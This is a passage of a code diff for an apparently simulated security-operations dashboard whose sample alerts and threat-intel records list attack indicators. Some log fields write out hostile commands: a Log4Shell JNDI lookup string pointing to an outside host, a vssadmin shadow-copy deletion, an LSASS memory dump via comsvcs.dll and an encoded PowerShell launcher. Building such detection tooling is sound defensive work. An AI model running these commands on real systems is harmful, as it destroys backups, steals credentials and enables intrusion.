-                        summary: "Hosts reverse-proxy phishing kits targeting Microsoft Entra ID & Okta MFA session cookies."
-                    },
-                    "45.155.205.233": {
-                        type: "IPv4 Address",
-                        riskScore: 92,
-                        verdict: "MALICIOUS // MASS EXPLOIT SCANNER",
-                        vtDetections: "59 / 92 Security Vendors",
-                        abuseConfidence: "99% (1,890 Reports)",
-                        asn: "AS210644 (Aeza International LTD)",
-                        country: "Netherlands (NL)",
-                        mitre: ["T1190 (Exploit Public-Facing App)", "T1595.002 (Vulnerability Scanning)"],
-                        threatActor: "Opportunistic Botnet / Kinsing Crypto-Miner",
-                        summary: "Actively sprays JNDI LDAP exploit payloads (CVE-2021-44228) and PAN-OS command injection probes."
-                    },
-                    "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855": {
-                        type: "SHA-256 File Hash",
-                        riskScore: 98,
-                        verdict: "MALICIOUS // BLACKBASTA / COBALT LOADER",
-                        vtDetections: "68 / 74 Antivirus Engines",
-                        abuseConfidence: "High Confidence Malware Payload",
-                        asn: "Signed: Invalid / Revoked Cert",
-                        country: "First Seen: 2026-11-02 UTC",
-                        mitre: ["T1218.011 (Rundll32 Execution)", "T1490 (Inhibit System Recovery)"],
-                        threatActor: "BlackBasta Ransomware Affiliate",
-                        summary: "64-bit DLL stager (`update.dll`) that decrypts an embedded Cobalt Strike beacon in memory and deletes shadow copies."
-                    },
-                    "login-micros0ft-auth.com": {
-                        type: "Domain Name",
-                        riskScore: 85,
-                        verdict: "PHISHING // TYPOSQUAT C2 DOMAIN",
-                        vtDetections: "39 / 92 Security Vendors",
-                        abuseConfidence: "Newly Registered Domain (NRD < 48h)",
-                        asn: "Registrar: NameCheap / Cloudflare Proxied",
-                        country: "Resolves to: 91.214.124.88",
-                        mitre: ["T1566.002 (Spearphishing Link)", "T1583.001 (Acquire Domains)"],
-                        threatActor: "Credential Harvesting Campaign",
-                        summary: "Evilginx2 lure domain impersonating corporate Microsoft 365 Federation Services."
-                    },
-                    "8.8.8.8": {
-                        type: "IPv4 Address",
-                        riskScore: 4,
-                        verdict: "BENIGN // TRUSTED INFRASTRUCTURE",
-                        vtDetections: "0 / 92 Security Vendors",
-                        abuseConfidence: "0% (Whitelisted)",
-                        asn: "AS15169 (Google LLC)",
-                        country: "United States (US)",
-                        mitre: ["None (Standard DNS Resolver)"],
-                        threatActor: "None — Google Public DNS",
-                        summary: "Authoritative public anycast DNS resolver operated by Google LLC."
+                },
+                {
+                    id: "ALT-9401",
+                    timestamp: "11:36:04 UTC",
+                    severity: "Critical",
+                    title: "Ransomware Volume Shadow Copy Deletion (vssadmin)",
+                    mitreId: "T1490",
+                    mitreName: "Inhibit System Recovery",
+                    cve: "CVE-2024-21412",
+                    srcIp: "10.40.12.91",
+                    hostname: "ERP-SQL-PROD01",
+                    user: "svc_sqlbackup",
+                    status: "New",
+                    assignee: "Unassigned",
+                    isolated: true,
+                    ipBlocked: false,
+                    tokensRevoked: false,
+                    checklist: [{
+                            text: "Confirm vssadmin.exe delete shadows /all /quiet execution",
+                            done: true
+                        },
+                        {
+                            text: "Verify host containment lock on ERP-SQL-PROD01",
+                            done: true
+                        },
+                        {
+                            text: "Revoke svc_sqlbackup Kerberos TGT & active sessions",
+                            done: false
+                        },
+                        {
+                            text: "Trigger immutable SAN snapshot verification",
+                            done: false
+                        }
+                    ],
+                    notes: [{
+                        ts: "11:36:30 UTC",
+                        author: "SOAR Auto-Response",
+                        text: "High-confidence ransomware behavior detected. Host ERP-SQL-PROD01 auto-isolated."
+                    }],
+                    rawLog: {
+                        cefVersion: "CEF:0|Microsoft|DefenderATP|4.18|ProcessCreation|Shadow Copy Deletion|10|",
+                        src: "10.40.12.91",
+                        dstHost: "ERP-SQL-PROD01",
+                        process: "C:\\Windows\\System32\\vssadmin.exe",
+                        cmdLine: "vssadmin.exe delete shadows /all /quiet"
                     }
+                },
+                {
+                    id: "ALT-9398",
+                    timestamp: "11:24:19 UTC",
+                    severity: "High",
+                    title: "Impossible Travel & Evilginx OAuth Token Replay",
+                    mitreId: "T1528",
+                    mitreName: "Steal Application Access Token",
+                    cve: "N/A (Identity)",
+                    srcIp: "91.214.124.88",
+                    hostname: "ENTRA-ID-SSO",
+                    user: "cfo.wilson@corp.local",
+                    status: "New",
+                    assignee: "A. Mercer (T2)",
+                    isolated: false,
+                    ipBlocked: true,
+                    tokensRevoked: false,
+                    checklist: [{
+                            text: "Compare login geo-velocity (London UK -> Novosibirsk RU in 9 mins)",
+                            done: true
+                        },
+                        {
+                            text: "Check session cookie fingerprint for AiTM proxy relay",
+                            done: false
+                        },
+                        {
+                            text: "Revoke Entra ID Refresh Tokens for cfo.wilson@corp.local",
+                            done: false
+                        }
+                    ],
+                    notes: [{
+                        ts: "11:26:10 UTC",
+                        author: "A. Mercer (T2)",
+                        text: "User authenticated via London office IP 51.140.22.10, followed 9 mins later by token replay from ASN 49505."
+                    }],
+                    rawLog: {
+                        cefVersion: "CEF:0|Microsoft|EntraIDIdentityProtection|2.1|UnfamiliarSignIn|AiTM Token Replay|8|",
+                        src: "91.214.124.88",
+                        dstHost: "ENTRA-ID-SSO",
+                        userPrincipalName: "cfo.wilson@corp.local",
+                        appDisplayName: "Microsoft Exchange Online"
+                    }
+                },
+                {
+                    id: "ALT-9395",
+                    timestamp: "11:09:47 UTC",
+                    severity: "High",
+                    title: "Suspicious PowerShell EncodedCommand AMSI Bypass",
+                    mitreId: "T1059.001",
+                    mitreName: "Command and Scripting: PowerShell",
+                    cve: "N/A",
+                    srcIp: "10.14.88.204",
+                    hostname: "DEV-BUILD-09",
+                    user: "d.kowalski",
+                    status: "Investigating",
+                    assignee: "S. Chen (T3 Threat Hunt)",
+                    isolated: false,
+                    ipBlocked: false,
+                    tokensRevoked: false,
+                    checklist: [{
+                            text: "Decode Base64 payload from ScriptBlock logging (Event ID 4104)",
+                            done: true
+                        },
+                        {
+                            text: "Check if AmsiUtils.amsiInitFailed reflection succeeded",
+                            done: true
+                        },
+                        {
+                            text: "Isolate DEV-BUILD-09 if outbound cradle connection observed",
+                            done: false
+                        }
+                    ],
+                    notes: [{
+                        ts: "11:14:02 UTC",
+                        author: "S. Chen (T3 Threat Hunt)",
+                        text: "Decoded script attempts reflection on System.Management.Automation.AmsiUtils."
+                    }],
+                    rawLog: {
+                        cefVersion: "CEF:0|Splunk|EnterpriseSecurity|8.2|Event4104|PowerShell EncodedCommand|8|",
+                        src: "10.14.88.204",
+                        dstHost: "DEV-BUILD-09",
+                        process: "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0..."
+                    }
+                },
+                {
+                    id: "ALT-9391",
+                    timestamp: "10:52:33 UTC",
+                    severity: "High",
+                    title: "Apache Log4j JNDI LDAP RCE Exploitation Attempt",
+                    mitreId: "T1190",
+                    mitreName: "Exploit Public-Facing Application",
+                    cve: "CVE-2021-44228",
+                    srcIp: "45.155.205.233",
+                    hostname: "DMZ-API-GW02",
+                    user: "anonymous",
+                    status: "Contained",
+                    assignee: "M. Patel (IR Lead)",
+                    isolated: false,
+                    ipBlocked: true,
+                    tokensRevoked: false,
+                    checklist: [{
+                            text: "Inspect WAF payload for ${jndi:ldap://45.155.205.233:1389/a}",
+                            done: true
+                        },
+                        {
+                            text: "Confirm DMZ-API-GW02 runs patched Log4j 2.17.1+",
+                            done: true
+                        },
+                        {
+                            text: "Verify source IP 45.155.205.233 is added to PAN-OS blocklist",
+                            done: true
+                        }
+                    ],
+                    notes: [{
+                        ts: "10:56:00 UTC",
+                        author: "M. Patel (IR Lead)",
+                        text: "WAF blocked request with 403. No egress LDAP callback initiated by DMZ-API-GW02."
+                    }],
+                    rawLog: {
+                        cefVersion: "CEF:0|Cloudflare|WAF|5.0|100512|Log4Shell JNDI Injection|8|",
+                        src: "45.155.205.233",
+                        dstHost: "DMZ-API-GW02",
+                        httpUserAgent: "${jndi:ldap://45.155.205.233:1389/Exploit}"
+                    }
+                },
+                {
+                    id: "ALT-9387",
+                    timestamp: "10:31:15 UTC",
+                    severity: "Medium",
+                    title: "Palo Alto PAN-OS GlobalProtect Command Injection Probe",
+                    mitreId: "T1190",
+                    mitreName: "Exploit Public-Facing Application",
+                    cve: "CVE-2024-3400",
+                    srcIp: "193.163.125.77",
+                    hostname: "FW-EDGE-LON01",
+                    user: "system",
+                    status: "Investigating",
+                    assignee: "A. Mercer (T2)",
+                    isolated: false,
+                    ipBlocked: true,
+                    tokensRevoked: false,
+                    checklist: [{
+                            text: "Check SESSID cookie path traversal in GlobalProtect logs",
+                            done: true
+                        },
+                        {
+                            text: "Verify hotfix PAN-OS 11.1.2-h3 is installed on FW-EDGE-LON01",
+                            done: false
+                        }
+                    ],
+                    notes: [{
+                        ts: "10:35:12 UTC",
+                        author: "A. Mercer (T2)",
+                        text: "Observed automated telemetry directory creation attempt via SESSID cookie."
+                    }],
+                    rawLog: {
+                        cefVersion: "CEF:0|PaloAltoNetworks|PAN-OS|11.1|Threat|CVE-2024-3400 Telemetry Exploit|7|",
+                        src: "193.163.125.77",
+                        dstHost: "FW-EDGE-LON01",
+                        uri: "/ssl-vpn/hipreport.esp"
+                    }
+                },
+                {
+                    id: "ALT-9380",
+                    timestamp: "10:04:50 UTC",
+                    severity: "Low",
+                    title: "Internal Vulnerability Scanner SMB Enumeration",
+                    mitreId: "T1046",
+                    mitreName: "Network Service Discovery",
+                    cve: "N/A",
+                    srcIp: "10.10.2.50",
+                    hostname: "CORP-DC-01",
+                    user: "svc_nessus",
+                    status: "False Positive",
+                    assignee: "A. Mercer (T2)",
+                    isolated: false,
+                    ipBlocked: false,
+                    tokensRevoked: false,
+                    checklist: [{
+                            text: "Verify source IP 10.10.2.50 against authorized Qualys/Tenable scanner subnet",
+                            done: true
+                        },
+                        {
+                            text: "Close alert as scheduled maintenance scan",
+                            done: true
+                        }
+                    ],
+                    notes: [{
+                        ts: "10:08:00 UTC",
+                        author: "A. Mercer (T2)",
+                        text: "Confirmed authorized weekly Tenable Nessus credentialed scan."
+                    }],
+                    rawLog: {
+                        cefVersion: "CEF:0|Zeek|NetworkMonitor|6.0|SMBScan|Authorized Scanner Traffic|3|",
+                        src: "10.10.2.50",
+                        dstHost: "CORP-DC-01",
+                        service: "microsoft-ds (445/tcp)"
+                    }
+                }
+            ];
+
+            // Threat Intelligence Database for IOC Enrichment
+            const ctiDatabase = {
+                "185.220.101.44": {
+                    type: "IPv4 Address",
+                    riskScore: 96,
+                    verdict: "MALICIOUS // COBALT STRIKE C2",
+                    vtDetections: "64 / 92 Security Vendors",
+                    abuseConfidence: "100% (412 Reports in 14d)",
+                    asn: "AS205100 (F3 Netze e.V. / Bulletproof Node)",
+                    country: "Germany (DE) — Tor Exit & C2 Relay",
+                    mitre: ["T1071.001 (Web Protocols)", "T1055 (Process Injection)",
+                        "T1105 (Ingress Tool Transfer)"
+                    ],
+                    threatActor: "UNC2452 / FIN7 Infrastructure Overlap",
+                    summary: "Known Cobalt Strike TeamServer listening on ports 443/8443 using a spoofed Cloudflare SSL certificate."
+                },
+                "91.214.124.88": {
+                    type: "IPv4 Address",
+                    riskScore: 89,
+                    verdict: "MALICIOUS // EVILGINX AiTM PROXY",
+                    vtDetections: "48 / 92 Security Vendors",
+                    abuseConfidence: "94% (128 Reports)",
+                    asn: "AS49505 (Selectel VDS Network)",
+                    country: "Russian Federation (RU)",
+                    mitre: ["T1528 (Steal Application Access Token)", "T1539 (Steal Web Session Cookie)"],
+                    threatActor: "Midnight Blizzard / AiTM Phishing Cluster",
+                    summary: "Hosts reverse-proxy phishing kits targeting Microsoft Entra ID & Okta MFA session cookies."
+                },
+                "45.155.205.233": {
+                    type: "IPv4 Address",
+                    riskScore: 92,
+                    verdict: "MALICIOUS // MASS EXPLOIT SCANNER",
+                    vtDetections: "59 / 92 Security Vendors",
+                    abuseConfidence: "99% (1,890 Reports)",
+                    asn: "AS210644 (Aeza International LTD)",
+                    country: "Netherlands (NL)",
+                    mitre: ["T1190 (Exploit Public-Facing App)", "T1595.002 (Vulnerability Scanning)"],
+                    threatActor: "Opportunistic Botnet / Kinsing Crypto-Miner",
+                    summary: "Actively sprays JNDI LDAP exploit payloads (CVE-2021-44228) and PAN-OS command injection probes."
+                },
+                "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855": {
+                    type: "SHA-256 File Hash",
+                    riskScore: 98,
+                    verdict: "MALICIOUS // BLACKBASTA / COBALT LOADER",
+                    vtDetections: "68 / 74 Antivirus Engines",
+                    abuseConfidence: "High Confidence Malware Payload",
+                    asn: "Signed: Invalid / Revoked Cert",
+                    country: "First Seen: 2026-11-02 UTC",
+                    mitre: ["T1218.011 (Rundll32 Execution)", "T1490 (Inhibit System Recovery)"],
+                    threatActor: "BlackBasta Ransomware Affiliate",
+                    summary: "64-bit DLL stager (`update.dll`) that decrypts an embedded Cobalt Strike beacon in memory and deletes shadow copies."
+                },
+                "login-micros0ft-auth.com": {
+                    type: "Domain Name",
+                    riskScore: 85,
+                    verdict: "PHISHING // TYPOSQUAT C2 DOMAIN",
+                    vtDetections: "39 / 92 Security Vendors",
+                    abuseConfidence: "Newly Registered Domain (NRD < 48h)",
+                    asn: "Registrar: NameCheap / Cloudflare Proxied",
+                    country: "Resolves to: 91.214.124.88",
+                    mitre: ["T1566.002 (Spearphishing Link)", "T1583.001 (Acquire Domains)"],
+                    threatActor: "Credential Harvesting Campaign",
+                    summary: "Evilginx2 lure domain impersonating corporate Microsoft 365 Federation Services."
+                },
+                "8.8.8.8": {
+                    type: "IPv4 Address",
+                    riskScore: 4,
+                    verdict: "BENIGN // TRUSTED INFRASTRUCTURE",
+                    vtDetections: "0 / 92 Security Vendors",
+                    abuseConfidence: "0% (Whitelisted)",
+                    asn: "AS15169 (Google LLC)",
+                    country: "United States (US)",
+                    mitre: ["None (Standard DNS Resolver)"],
+                    threatActor: "None — Google Public DNS",
+                    summary: "Authoritative public anycast DNS resolver operated by Google LLC."
+                }
+            };
+
+            // Security Advisories (CISA KEV / NCSC style)
+            const advisoriesData = [{
+                    id: "NCSC-2026-089",
+                    cve: "CVE-2024-3400",
+                    title: "Palo Alto Networks PAN-OS GlobalProtect Unauthenticated RCE",
+                    severity: "Critical",
+                    cvss: "10.0",
+                    vendor: "Palo Alto Networks",
+                    dueDate: "Immediate Patch Required",
+                    iocMatch: "193.163.125.77",
+                    summary: "Command injection vulnerability in the GlobalProtect feature of Palo Alto Networks PAN-OS software allows an unauthenticated attacker to execute arbitrary code with root privileges on the firewall."
+                },
+                {
+                    id: "CISA-KEV-2026-14",
+                    cve: "CVE-2024-21412",
+                    title: "Microsoft Windows Defender SmartScreen Bypass (Water Hydra / Ransomware)",
+                    severity: "Critical",
+                    cvss: "8.1",
+                    vendor: "Microsoft Corporation",
+                    dueDate: "Active Ransomware Exploitation",
+                    iocMatch: "ERP-SQL-PROD01",
+                    summary: "Unauthenticated attackers leverage crafted Internet Shortcut (.URL) files to bypass SmartScreen checks and deliver ransomware loaders that immediately invoke vssadmin shadow copy deletion."
+                },
+                {
+                    id: "CISA-KEV-2021-99",
+                    cve: "CVE-2021-44228",
+                    title: "Apache Log4j2 JNDI Remote Code Execution (Log4Shell)",
+                    severity: "High",
+                    cvss: "10.0",
+                    vendor: "Apache Software Foundation",
+                    dueDate: "Continuous Perimeter Scanning",
+                    iocMatch: "45.155.205.233",
+                    summary: "Apache Log4j2 JNDI features used in configuration, log messages, and parameters do not protect against attacker-controlled LDAP and other JNDI related endpoints."
+                },
+                {
+                    id: "NCSC-2026-092",
+                    cve: "CVE-2024-38063",
+                    title: "Windows TCP/IP IPv6 Remote Code Execution Vulnerability",
+                    severity: "Critical",
+                    cvss: "9.8",
+                    vendor: "Microsoft Corporation",
+                    dueDate: "Patch Within 48 Hours",
+                    iocMatch: "NONE",
+                    summary: "An unauthenticated attacker could repeatedly send IPv6 packets that include specially crafted packets to a Windows machine, enabling remote code execution."
+                }
+            ];
+
+            // Pool of simulated incoming alerts for the "Simulate Alert" button
+            const incomingAlertTemplates = [{
+                    severity: "Critical",
+                    title: "Kerberoasting SPN Ticket Encryption Downgrade (RC4-HMAC)",
+                    mitreId: "T1558.003",
+                    mitreName: "Steal or Forge Kerberos Tickets: Kerberoasting",
+                    cve: "N/A (Active Directory)",
+                    srcIp: "10.14.22.108",
+                    hostname: "CORP-DC-01",
+                    user: "m.vance@corp.local",
+                    rawLog: {
+                        cefVersion: "CEF:0|Microsoft|ActiveDirectory|10.0|Event4769|RC4 Kerberos TGS Request|9|",
+                        src: "10.14.22.108",
+                        dstHost: "CORP-DC-01",
+                        serviceName: "MSSQLSvc/ERP-SQL-PROD01.corp.local:1433",
+                        ticketEncryptionType: "0x17 (RC4-HMAC)"
+                    }
+                },
+                {
+                    severity: "High",
+                    title: "LSASS Memory Dump via comsvcs.dll MiniDump",
+                    mitreId: "T1003.001",
+                    mitreName: "OS Credential Dumping: LSASS Memory",
+                    cve: "N/A",
+                    srcIp: "10.20.4.19",
+                    hostname: "HR-LAPTOP-114",
+                    user: "k.danvers",
+                    rawLog: {
+                        cefVersion: "CEF:0|CrowdStrike|FalconHost|7.14|CredentialDump|LSASS MiniDump Attempt|9|",
+                        src: "10.20.4.19",
+                        dstHost: "HR-LAPTOP-114",
+                        cmdLine: "rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump 624 C:\\temp\\lsass.dmp full"
+                    }
+                },
+                {
+                    severity: "Critical",
+                    title: "Unauthorized AWS IAM Root AccessKey Creation & S3 Exfil",
+                    mitreId: "T1098.001",
+                    mitreName: "Account Manipulation: Additional Cloud Credentials",
+                    cve: "N/A (Cloud IAM)",
+                    srcIp: "185.220.101.44",
+                    hostname: "AWS-PROD-ORG",
+                    user: "aws-ci-deployer",
+                    rawLog: {
+                        cefVersion: "CEF:0|AWS|CloudTrail|3.0|CreateAccessKey|IAM Persistence Detected|10|",
+                        src: "185.220.101.44",
+                        dstHost: "AWS-PROD-ORG",
+                        eventName: "CreateAccessKey"
+                    }
+                }
+            ];
+
+            // Application State
+            let selectedAlertId = alertsData[0].id;
+            let simCounter = 9403;
+
+            /********************************************************************
+             * 2. INITIALIZATION & REAL-TIME CLOCK
+             ********************************************************************/
+            window.addEventListener("DOMContentLoaded", () => {
+                renderSiemTable();
+                selectAlert(selectedAlertId);
+                renderAdvisoryTicker();
+                renderAdvisoriesTab();
+                runIocEnrichment();
+                updateSidebarBlocklist();
+                startUtcClock();
+            });
+
+            function startUtcClock() {
+                const updateClock = () => {
+                    const now = new Date();
+                    const utcString = now.toISOString().replace("T", " ").substring(0, 19) + " UTC";
+                    document.getElementById("utcClock").textContent = utcString;
                 };
+                updateClock();
+                setInterval(updateClock, 1000);
+            }
 
-                // Security Advisories (CISA KEV / NCSC style)
-                const advisoriesData = [{
-                        id: "NCSC-2026-089",
-                        cve: "CVE-2024-3400",
-                        title: "Palo Alto Networks PAN-OS GlobalProtect Unauthenticated RCE",
-                        severity: "Critical",
-                        cvss: "10.0",
-                        vendor: "Palo Alto Networks",
-                        dueDate: "Immediate Patch Required",
-                        iocMatch: "193.163.125.77",
-                        summary: "Command injection vulnerability in the GlobalProtect feature of Palo Alto Networks PAN-OS software allows an unauthenticated attacker to execute arbitrary code with root privileges on the firewall."
-                    },
-                    {
-                        id: "CISA-KEV-2026-14",
-                        cve: "CVE-2024-21412",
-                        title: "Microsoft Windows Defender SmartScreen Bypass (Water Hydra / Ransomware)",
-                        severity: "Critical",
-                        cvss: "8.1",
-                        vendor: "Microsoft Corporation",
-                        dueDate: "Active Ransomware Exploitation",
-                        iocMatch: "ERP-SQL-PROD01",
-                        summary: "Unauthenticated attackers leverage crafted Internet Shortcut (.URL) files to bypass SmartScreen checks and deliver ransomware loaders that immediately invoke vssadmin shadow copy deletion."
-                    },
-                    {
-                        id: "CISA-KEV-2021-99",
-                        cve: "CVE-2021-44228",
-                        title: "Apache Log4j2 JNDI Remote Code Execution (Log4Shell)",
-                        severity: "High",
-                        cvss: "10.0",
-                        vendor: "Apache Software Foundation",
-                        dueDate: "Continuous Perimeter Scanning",
-                        iocMatch: "45.155.205.233",
-                        summary: "Apache Log4j2 JNDI features used in configuration, log messages, and parameters do not protect against attacker-controlled LDAP and other JNDI related endpoints."
-                    },
-                    {
-                        id: "NCSC-2026-092",
-                        cve: "CVE-2024-38063",
-                        title: "Windows TCP/IP IPv6 Remote Code Execution Vulnerability",
-                        severity: "Critical",
-                        cvss: "9.8",
-                        vendor: "Microsoft Corporation",
-                        dueDate: "Patch Within 48 Hours",
-                        iocMatch: "NONE",
-                        summary: "An unauthenticated attacker could repeatedly send IPv6 packets that include specially crafted packets to a Windows machine, enabling remote code execution."
-                    }
-                ];
+            /********************************************************************
+             * 3. WORKSPACE NAVIGATION & THEME TOGGLE
+             ********************************************************************/
+            function switchWorkspaceTab(tabId) {
+                document.querySelectorAll(".workspace-tab").forEach(el => el.classList.add("d-none"));
+                document.getElementById(tabId).classList.remove("d-none");
 
-                // Pool of simulated incoming alerts for the "Simulate Alert" button
-                const incomingAlertTemplates = [{
-                        severity: "Critical",
-                        title: "Kerberoasting SPN Ticket Encryption Downgrade (RC4-HMAC)",
-                        mitreId: "T1558.003",
-                        mitreName: "Steal or Forge Kerberos Tickets: Kerberoasting",
-                        cve: "N/A (Active Directory)",
-                        srcIp: "10.14.22.108",
-                        hostname: "CORP-DC-01",
-                        user: "m.vance@corp.local",
-                        rawLog: {
-                            cefVersion: "CEF:0|Microsoft|ActiveDirectory|10.0|Event4769|RC4 Kerberos TGS Request|9|",
-                            src: "10.14.22.108",
-                            dstHost: "CORP-DC-01",
-                            serviceName: "MSSQLSvc/ERP-SQL-PROD01.corp.local:1433",
-                            ticketEncryptionType: "0x17 (RC4-HMAC)"
-                        }
-                    },
-                    {
-                        severity: "High",
-                        title: "LSASS Memory Dump via comsvcs.dll MiniDump",
-                        mitreId: "T1003.001",
-                        mitreName: "OS Credential Dumping: LSASS Memory",
-                        cve: "N/A",
-                        srcIp: "10.20.4.19",
-                        hostname: "HR-LAPTOP-114",
-                        user: "k.danvers",
-                        rawLog: {
-                            cefVersion: "CEF:0|CrowdStrike|FalconHost|7.14|CredentialDump|LSASS MiniDump Attempt|9|",
-                            src: "10.20.4.19",
-                            dstHost: "HR-LAPTOP-114",
-                            cmdLine: "rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump 624 C:\\temp\\lsass.dmp full"
-                        }
-                    },
-                    {
-                        severity: "Critical",
-                        title: "Unauthorized AWS IAM Root AccessKey Creation & S3 Exfil",
-                        mitreId: "T1098.001",
-                        mitreName: "Account Manipulation: Additional Cloud Credentials",
-                        cve: "N/A (Cloud IAM)",
-                        srcIp: "185.220.101.44",
-                        hostname: "AWS-PROD-ORG",
-                        user: "aws-ci-deployer",
-                        rawLog: {
-                            cefVersion: "CEF:0|AWS|CloudTrail|3.0|CreateAccessKey|IAM Persistence Detected|10|",
-                            src: "185.220.101.44",
-                            dstHost: "AWS-PROD-ORG",
-                            eventName: "CreateAccessKey"
-                        }
-                    }
-                ];
-
-                // Application State
-                let selectedAlertId = alertsData[0].id;
-                let simCounter = 9403;
-
-                /********************************************************************
-                 * 2. INITIALIZATION & REAL-TIME CLOCK
-                 ********************************************************************/
-                window.addEventListener("DOMContentLoaded", () => {
-                    renderSiemTable();
-                    selectAlert(selectedAlertId);
-                    renderAdvisoryTicker();
-                    renderAdvisoriesTab();
-                    runIocEnrichment();
-                    updateSidebarBlocklist();
-                    startUtcClock();
+                document.querySelectorAll(".soc-nav-link").forEach(link => {
+                    link.classList.toggle("active", link.getAttribute("data-tab") === tabId);
                 });
 
-                function startUtcClock() {
-                    const updateClock = () => {
-                        const now = new Date();
-                        const utcString = now.toISOString().replace("T", " ").substring(0, 19) + " UTC";
-                        document.getElementById("utcClock").textContent = utcString;
-                    };
-                    updateClock();
-                    setInterval(updateClock, 1000);
-                }
+                // Close mobile sidebar if open
+                document.getElementById("socSidebar").classList.remove("mobile-open");
+            }
 
-                /********************************************************************
-                 * 3. WORKSPACE NAVIGATION & THEME TOGGLE
-                 ********************************************************************/
-                function switchWorkspaceTab(tabId) {
-                    document.querySelectorAll(".workspace-tab").forEach(el => el.classList.add("d-none"));
-                    document.getElementById(tabId).classList.remove("d-none");
+            function toggleTheme() {
+                const htmlEl = document.documentElement;
+                const current = htmlEl.getAttribute("data-bs-theme");
+                const next = current === "dark" ? "light" : "dark";
+                htmlEl.setAttribute("data-bs-theme", next);
 
-                    document.querySelectorAll(".soc-nav-link").forEach(link => {
-                        link.classList.toggle("active", link.getAttribute("data-tab") === tabId);
-                    });
+                document.getElementById("themeIconSun").classList.toggle("d-none", next === "light");
+                document.getElementById("themeIconMoon").classList.toggle("d-none", next === "dark");
+                showSocToast(`Switched workbench theme to ${next.toUpperCase()} mode`, "info");
+            }
 
-                    // Close mobile sidebar if open
-                    document.getElementById("socSidebar").classList.remove("mobile-open");
-                }
+            function toggleRightDrawer() {
+                document.getElementById("soarDrawer").classList.toggle("collapsed");
+            }
 
-                function toggleTheme() {
-                    const htmlEl = document.documentElement;
-                    const current = htmlEl.getAttribute("data-bs-theme");
-                    const next = current === "dark" ? "light" : "dark";
-                    htmlEl.setAttribute("data-bs-theme", next);
+            /********************************************************************
+             * 4. SIEM ALERT QUEUE RENDERING & FILTERING
+             ********************************************************************/
+            function renderSiemTable() {
+                const query = document.getElementById("siemSearchInput").value.trim().toLowerCase();
+                const sevFilter = document.getElementById("filterSeverity").value;
+                const statusFilter = document.getElementById("filterStatus").value;
 
-                    document.getElementById("themeIconSun").classList.toggle("d-none", next === "light");
-                    document.getElementById("themeIconMoon").classList.toggle("d-none", next === "dark");
-                    showSocToast(`Switched workbench theme to ${next.toUpperCase()} mode`, "info");
-                }
+                const filtered = alertsData.filter(alert => {
+                    const matchesSev = sevFilter === "ALL" || alert.severity === sevFilter;
+                    const matchesStatus = statusFilter === "ALL" || alert.status === statusFilter;
+                    const searchable =
+                        `${alert.id} ${alert.title} ${alert.srcIp} ${alert.hostname} ${alert.mitreId} ${alert.cve} ${alert.user}`
+                        .toLowerCase();
+                    const matchesQuery = !query || searchable.includes(query);
+                    return matchesSev && matchesStatus && matchesQuery;
+                });
 
-                function toggleRightDrawer() {
-                    document.getElementById("soarDrawer").classList.toggle("collapsed");
-                }
+                const tbody = document.getElementById("siemTableBody");
+                tbody.innerHTML = "";
 
-                /********************************************************************
-                 * 4. SIEM ALERT QUEUE RENDERING & FILTERING
-                 ********************************************************************/
-                function renderSiemTable() {
-                    const query = document.getElementById("siemSearchInput").value.trim().toLowerCase();
-                    const sevFilter = document.getElementById("filterSeverity").value;
-                    const statusFilter = document.getElementById("filterStatus").value;
-
-                    const filtered = alertsData.filter(alert => {
-                        const matchesSev = sevFilter === "ALL" || alert.severity === sevFilter;
-                        const matchesStatus = statusFilter === "ALL" || alert.status === statusFilter;
-                        const searchable =
-                            `${alert.id} ${alert.title} ${alert.srcIp} ${alert.hostname} ${alert.mitreId} ${alert.cve} ${alert.user}`
-                            .toLowerCase();
-                        const matchesQuery = !query || searchable.includes(query);
-                        return matchesSev && matchesStatus && matchesQuery;
-                    });
-
-                    const tbody = document.getElementById("siemTableBody");
-                    tbody.innerHTML = "";
-
-                    if (filtered.length === 0) {
-                        tbody.innerHTML = `
+                if (filtered.length === 0) {
+                    tbody.innerHTML = `
         <tr>
           <td colspan="8" class="text-center py-5 text-secondary">
             <div class="fw-semibold mb-1">No matching SIEM alerts in queue</div>
             <div class="small">Try clearing active search filters or click "Simulate Alert" to inject telemetry.</div>
           </td>
         </tr>`;
-                    } else {
-                        filtered.forEach(alert => {
-                            const isSelected = alert.id === selectedAlertId;
-                            const statusBadgeMap = {
-                                "New": "bg-danger-subtle text-danger border border-danger-subtle",
-                                "Investigating": "bg-info-subtle text-info border border-info-subtle",
-                                "Contained": "bg-success-subtle text-success border border-success-subtle",
-                                "False Positive": "bg-secondary-subtle text-secondary border border-secondary-subtle"
-                            };
+                } else {
+                    filtered.forEach(alert => {
+                        const isSelected = alert.id === selectedAlertId;
+                        const statusBadgeMap = {
+                            "New": "bg-danger-subtle text-danger border border-danger-subtle",
+                            "Investigating": "bg-info-subtle text-info border border-info-subtle",
+                            "Contained": "bg-success-subtle text-success border border-success-subtle",
+                            "False Positive": "bg-secondary-subtle text-secondary border border-secondary-subtle"
+                        };
 
-                            const tr = document.createElement("tr");
-                            if (isSelected) tr.classList.add("active-alert-row");
-                            tr.onclick = (e) => {
-                                if (e.target.closest("button") || e.target.closest("select")) return;
-                                selectAlert(alert.id);
-                            };
+                        const tr = document.createElement("tr");
+                        if (isSelected) tr.classList.add("active-alert-row");
+                        tr.onclick = (e) => {
+                            if (e.target.closest("button") || e.target.closest("select")) return;
+                            selectAlert(alert.id);
+                        };
 
-                            tr.innerHTML = `
+                        tr.innerHTML = `
           <td>
             <div class="mono fw-bold text-info">${alert.id}</div>
             <div class="mono text-secondary" style="font-size: 0.7rem;">${alert.timestamp}</div>
@@ -1668,420 +1663,420 @@
             </div>
           </td>
         `;
-                            tbody.appendChild(tr);
-                        });
-                    }
-
-                    updateTopKpis(filtered.length);
+                        tbody.appendChild(tr);
+                    });
                 }
 
-                function resetSiemFilters() {
-                    document.getElementById("siemSearchInput").value = "";
-                    document.getElementById("filterSeverity").value = "ALL";
-                    document.getElementById("filterStatus").value = "ALL";
-                    renderSiemTable();
+                updateTopKpis(filtered.length);
+            }
+
+            function resetSiemFilters() {
+                document.getElementById("siemSearchInput").value = "";
+                document.getElementById("filterSeverity").value = "ALL";
+                document.getElementById("filterStatus").value = "ALL";
+                renderSiemTable();
+            }
+
+            function updateTopKpis(filteredCount) {
